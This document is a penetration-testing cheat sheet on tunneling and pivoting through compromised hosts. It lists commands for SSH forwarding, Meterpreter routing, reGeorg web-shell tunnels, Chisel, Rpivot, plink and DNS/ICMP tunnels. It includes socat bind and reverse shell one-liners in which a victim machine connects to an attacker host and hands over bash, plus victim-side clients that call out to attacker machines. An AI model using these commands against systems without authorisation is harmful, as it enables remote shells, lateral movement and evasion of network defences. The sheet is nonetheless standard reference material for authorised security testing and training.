# 📡 **Tunneling and Port Forwarding**

## **SSH Tunneling**

### SSH Graphical Connection (X11 Forwarding)

```bash
bash
CopyEdit
ssh -Y -C <user>@<ip>
# -Y: Enables trusted X11 forwarding (faster, but less secure than -X)
# -C: Compresses data during transfer (faster for slow connections)


```

---

### Local to Remote Port Forwarding (Local → Remote)

Open a port on the SSH server and map it to a different internal port.

```bash
bash
CopyEdit
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1
# Now, port 1521 on the SSH server is accessible via port 10521 externally

ssh adminuser@10.10.155.5 -i id_rsa -D 9050 #TOR port

#Change the info in /etc/proxychains4.conf also enable "Quiet Mode"

proxychains4 crackmapexec smb 10.10.10.0/24 #Example
```

```bash
bash
CopyEdit
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1
# Access internal IP 10.0.0.1:1521 through the server's 10521 port

```

---

### Port-to-Port Forwarding (Pivoting)

Redirect a port through a compromised SSH machine to another target machine.

```bash
bash
CopyEdit
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<target_ip>:<target_port> [-p <ssh_port>] [-N -f]
# -L: Local port forwarding
# -N: Don't execute a remote command
# -f: Backgrounds the SSH session

```

Example:

```bash
bash
CopyEdit
sudo ssh -L 631:<target_ip>:631 -N -f -l <username> <compromised_ip>

```

---

### Dynamic Proxy (SOCKS4/5)

Use SSH to create a SOCKS proxy through the compromised host.

```bash
bash
CopyEdit
ssh -f -N -D <local_port> <username>@<ip_compromised>
# -D: Dynamic application-level port forwarding (SOCKS proxy)

```

*Example:* Use proxychains with `socks4 127.0.0.1:<local_port>`

---

### VPN-like SSH Tunnel

Create a full VPN over SSH (needs root privileges on both ends):

Server Requirements in `sshd_config`:

```
text
CopyEdit
PermitRootLogin yes
PermitTunnel yes

```

Create tun interfaces:

```bash
bash
CopyEdit
ssh root@server -w any:any
# After connection:
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0  # Client
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0  # Server

```

Enable routing and NAT on the server:

```bash
bash
CopyEdit
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE

```

Route traffic on client:

```bash
bash
CopyEdit
route add -net 10.0.0.0/16 gw 1.1.1.1

```

---

## **SSHuttle - Transparent SSH VPN**

Tunnel all traffic to a subnet through a compromised SSH host.

```bash
bash
CopyEdit
pip install sshuttle
sshuttle -r user@host 10.10.10.0/24
# Routes all traffic destined for 10.10.10.0/24 through SSH

```

---

## **Meterpreter Pivoting**

Inside a Meterpreter session:

### Port Forwarding (Meterpreter `portfwd`)

```bash
bash
CopyEdit
portfwd add -l <local_port> -p <remote_port> -r <remote_host>
# Local -> Compromised -> Remote

```

### SOCKS Proxy with Meterpreter

```bash
bash
CopyEdit
background
route add <victim_ip> <netmask> <session_id>

use auxiliary/server/socks_proxy
run

# Configure proxychains:
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf

```

Alternatively, with `autoroute`:

```bash
bash
CopyEdit
background
use post/multi/manage/autoroute
set SESSION <session_id>
set SUBNET <victim_subnet>
set NETMASK <netmask>
run

use auxiliary/server/socks_proxy
set VERSION 4a
run

```

---

## **Other Tunneling Tools**

### reGeorg

Pivot through a web shell tunnel (PHP/JSP/ASPX).

```bash
bash
CopyEdit
python reGeorgSocksProxy.py -p 8080 -u http://<victim_ip>/path/to/tunnel.jsp

```

> reGeorg GitHub
> 

---

### Chisel

Fast TCP tunneling over HTTP using client-server setup.

- **SOCKS Proxy:**

```bash
bash
CopyEdit
./chisel server -p 8080 --reverse
./chisel client <attacker_ip>:8080 R:socks

```

- **Port Forwarding:**

```bash
bash
CopyEdit
./chisel server -p 12312 --reverse
./chisel client <attacker_ip>:12312 R:<local_port>:<target_ip>:<target_port>

```

> Chisel GitHub
> 

---

### Rpivot

Reverse SOCKS proxy pivoting.

- **Attacker:**

```bash
bash
CopyEdit
python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080

```

- **Victim:**

```bash
bash
CopyEdit
python client.py --server-ip <attacker_ip> --server-port 9999

```

> Rpivot GitHub
> 

---

## **Socat**

Versatile data relay tool.

- **Bind Shell:**

```bash
bash
CopyEdit
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337

```

- **Reverse Shell:**

```bash
bash
CopyEdit
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP:<attacker_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane

```

- **Port Forwarding via SOCKS:**

```bash
bash
CopyEdit
socat TCP-LISTEN:<local_port>,fork SOCKS4A:127.0.0.1:<target_host>:<target_port>,socksport=<proxy_port>

```

- **SSL Socat Tunnel:**

```bash
bash
CopyEdit
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
victim> socat TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt

```

---

## **Plink (Windows)**

Command-line SSH client, great for reverse tunnels.

```bash
bash
CopyEdit
plink.exe -l <username> -pw <password> -R <local_port>:<target_ip>:<target_port> <attacker_ip>

```

Example:

```bash
bash
CopyEdit
plink.exe -l root -pw password -R 9090:127.0.0.1:9090 10.11.0.41

```

---

## **NTLM Proxy Bypass**

- Using **Rpivot**
- Using **OpenVPN** with NTLM proxy:

```bash
bash
CopyEdit
http-proxy <proxy_ip> 8080 <credentials_file> ntlm

```

- Using **Cntlm** proxy tool:

```
text
CopyEdit
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attacker_machine>:443

```

> Cntlm official page
> 

---

## **Other Special Tunnels**

### DNS Tunneling

- **Iodine (root required):**

```bash
bash
CopyEdit
iodined -f -c -P password 1.1.1.1 domain.com #Server
iodine -f -P password domain.com -r           #Client

```

- **DNSCat2 (no root needed):**

```bash
bash
CopyEdit
attacker> ruby dnscat2.rb domain.com
victim> ./dnscat2 domain.com

```

---

### ICMP Tunneling (hans/hanstunnel)

- Root access needed to create tun interfaces.

```bash
bash
CopyEdit
hans -v -f -s 1.1.1.1 -p password
hans -f -c <server_ip> -p password -v

```

---

## **Other Tools to Explore**

- [Secure Socket Funneling (SSF)](https://github.com/securesocketfunneling/ssf)
- [3proxy - Tiny proxy server](https://github.com/z3APA3A/3proxy)
- [gtunnel - Tunnels in Go](https://github.com/hotnops/gtunnel)
